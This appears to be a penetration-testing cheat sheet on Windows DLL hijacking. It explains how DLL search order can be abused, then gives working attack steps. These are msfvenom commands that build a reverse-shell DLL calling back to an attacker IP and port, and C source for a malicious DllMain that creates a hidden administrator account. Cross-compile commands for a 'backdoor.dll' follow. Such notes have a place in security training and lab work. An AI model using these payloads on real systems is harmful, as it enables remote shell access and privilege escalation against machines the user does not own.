## Description
A **DLL (Dynamic Link Library)** is a file that contains code and data that can be used by multiple programs simultaneously. It is somewhat analogous to a Linux `.so` (Shared Object) file. DLLs are used in Windows to hold libraries of functions, resources, and other components, allowing for modular and efficient coding. They enable code reuse across different applications and help reduce the size of executable files since multiple programs can share the same DLL file instead of each having its own copy.

Key Points About DLLs:  
1. **Functionality**: A DLL can contain functions, classes, variables, and resources like icons, images, or files. Applications or services can call these functions or use these resources without having to include them in their own codebase.  
2. **Dynamic Linking**: Unlike static libraries that are linked during the compilation of an application, DLLs are linked at runtime. When an application starts, it looks for the required DLLs and loads them into memory. If the DLLs are already loaded for another process, the application can share them, improving memory usage.  
3. **Windows Application/Service Startup**: When a Windows application or service starts, it often relies on several DLLs for the features it provides. For example, many system services and user applications require common DLLs (such as `kernel32.dll` or `user32.dll`) to interact with the operating system's core functionality.  
4. **Missing or Malicious DLLs**: If a required DLL is missing or can't be found in the expected locations, the application may fail to start or function properly. This process of searching for and loading DLLs can be exploited. Attackers may replace a legitimate DLL with a malicious one, or place a malicious DLL in a location where the application will find and load it first. This type of attack is known as **DLL hijacking** or **DLL preloading**.  
5. **DLL Hijacking**: In DLL hijacking, when a Windows application starts and searches for a required DLL, if the legitimate DLL is absent or an attacker has placed a malicious DLL with the same name in a directory that the application checks first, the system will load the malicious DLL. This allows the attacker to execute arbitrary code within the context of the application, potentially gaining control of the system or performing other malicious actions.

## How to ?
### Reverse shell
Generate reverse shell for `.dll`
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<TARGET_IP> LPORT=<PORT> -f dll -o rev.dll
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.17.38.79 LPORT=53 -f dll -o rev.dll
```
Upload `.dll` and trigger its execution

### Create User 
Create User `.dll` script
```c
#include <stdlib.h>
#include <windows.h>

BOOL APIENTRY DllMain(
HANDLE hModule,// Handle to DLL module
DWORD ul_reason_for_call,// Reason for calling function
LPVOID lpReserved ) // Reserved
{
    switch ( ul_reason_for_call )
    {
        case DLL_PROCESS_ATTACH: // A process is loading the DLL.
        int i;
  	    i = system ("net user HackingT1me Password123@! /add");
  	    i = system ("net localgroup administrators HackingT1me /add");
        break;
        case DLL_THREAD_ATTACH: // A process is creating a new thread.
        break;
        case DLL_THREAD_DETACH: // A thread exits normally.
        break;
        case DLL_PROCESS_DETACH: // A process unloads the DLL.
        break;
    }
    return TRUE;
}
```
Cross-compile the code according to the target machine specification
```
64-bit Windows DLL
x86_64-w64-mingw32-gcc -shared -o backdoor.dll yourcode.cpp

32-bit Windows DLL
i686-w64-mingw32-gcc -shared -o backdoor.dll yourcode.cpp
```
>Use g++ for C++ code

Upload `.dll` and trigger its execution
